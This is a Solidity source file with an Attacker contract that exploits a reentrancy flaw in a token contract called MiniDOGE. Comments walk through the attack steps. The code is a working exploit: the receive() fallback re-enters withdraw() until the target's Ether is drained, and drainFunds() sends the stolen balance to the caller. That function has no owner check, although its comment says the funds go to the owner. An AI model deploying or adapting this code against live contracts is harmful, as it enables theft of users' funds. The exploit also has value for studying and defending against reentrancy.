// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerableMiniDOGE
 * @dev Interface for the vulnerable MiniDOGE contract.
 * The vulnerability exists in a function that allows users to withdraw tokens.
 * The external call to transfer tokens is made before updating the user's balance,
 * which is a classic reentrancy pattern.
 */
interface IVulnerableMiniDOGE {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in the IVulnerableMiniDOGE contract.
 * Attack Steps:
 * 1. The attacker calls the `attack()` function with some Ether (e.g., 1 Ether).
 * 2. The `attack()` function deposits the Ether into the vulnerable `MiniDOGE` contract.
 * 3. The `attack()` function then calls the `withdraw()` function on the `MiniDOGE` contract.
 * 4. The `MiniDOGE` contract, during the `withdraw` process, sends Ether to this Attacker contract
 *    *before* updating the Attacker's balance to zero.
 * 5. The `receive()` function of this Attacker contract is triggered by the incoming Ether.
 * 6. Inside `receive()`, the Attacker contract re-enters the `MiniDOGE` contract's `withdraw` function.
 * 7. This loop continues until the `MiniDOGE` contract's balance is drained. The re-entrant call succeeds
 *    because the Attacker's balance in `MiniDOGE` has not yet been set to 0.
 */
contract Attacker {

    IVulnerableMiniDOGE public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = IVulnerableMiniDOGE(_target);
    }

    // Fallback function to receive Ether and trigger the re-entrant call
    receive() external payable {
        // As long as the vulnerable contract has more Ether than our initial deposit,
        // keep re-entering the withdraw function to drain it.
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    /**
     * @notice Initiates the attack.
     * The value sent with this transaction will be used for the initial deposit
     * and subsequent withdrawal attempts.
     */
    function attack() external payable {
        require(msg.value > 0, "Must send Ether to attack");
        attackAmount = msg.value;

        // Step 1: Deposit funds into the vulnerable contract to establish a balance.
        target.deposit{value: attackAmount}();

        // Step 2: Call the vulnerable withdraw function to start the reentrancy attack.
        target.withdraw(attackAmount);
    }

    /**
     * @notice Withdraws all stolen funds from this contract to the owner.
     */
    function drainFunds() external {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }

    /**
     * @notice A helper function to check the balance of this contract.
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}